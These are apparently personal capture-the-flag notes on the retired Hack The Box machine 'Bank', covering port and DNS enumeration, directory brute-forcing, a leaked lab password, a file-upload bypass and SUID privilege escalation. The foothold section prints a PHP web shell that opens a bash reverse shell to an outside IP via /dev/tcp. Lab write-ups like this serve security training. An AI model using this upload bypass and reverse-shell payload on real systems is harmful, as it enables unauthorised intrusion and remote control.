---
tags:
  - HTB
  - Retired
  - Linux
  - SUID
  - FileUpload
  - WebEnumeration
  - easy
creation date: 2017-06-16
Date Completed: 2024-09-28
CVEs: 
URL: https://app.hackthebox.com/machines/Bank
IP: 10.129.29.200
---
## Information Gathering
### Nmap (Ports/Services)
```
sudo nmap -sT -sV -sC -O -p- -T4 --min-rate=1000 $IP  
```

```
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)
|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)
|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)
|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.7 (Ubuntu)

```

### ffuf (Directories/Subdomain/Files)
nothing useful
### Nikto (Identify Technology)
nothing useful
### DNS
~~nothing useful~~ Try again loser

```
nmap -n --script "(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport" <IP>
```

```
dnsrecon -d bank.htb -n 10.129.29.200
```

```
dig axfr bank.htb @10.129.29.200
```

![[Pasted image 20240928111522.png]]

## Web Enum... 
looks like cookie stealing or something

![[Pasted image 20240928110400.png]]

I'm also able to inject stuff in user-agent...

### Parameter fuzzing
nothing useful
```
ffuf -w /opt/tools/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://bank.htb/login.php&FUZZ=value -c
```

### gobuster

```
gobuster dir -u http://bank.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 50
```

http://bank.htb/balance-transfer/68576f20e9732f1b2edc4df5b8533230.acc

![[Pasted image 20240928113032.png]]
!##HTBB4nkP4ssw0rd!##


# Foothold

![[Pasted image 20240928113203.png]]


![[Pasted image 20240928114000.png]]

![[Pasted image 20240928114022.png]]

### testing ideas
changed test.txt to test.htb and success

![[Pasted image 20240928114500.png]]

rev-shell.htb
```
<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.15.64/1337 0>&1'");
```

and I'm in

# Priv Esc

```
find / -perm -u=s -type f 2>/dev/null
```
/var/htb/bin/emergency
script elevates user to root 🐱‍💻 too easy

# Bullshit

So i was just supposed to guess at the domain name...............
Also, wtf is with having to use these rando wordlists?!?!?
# Maybe Useful Later
OpenSSH Command Execution
```
searchsploit -x 45001
```

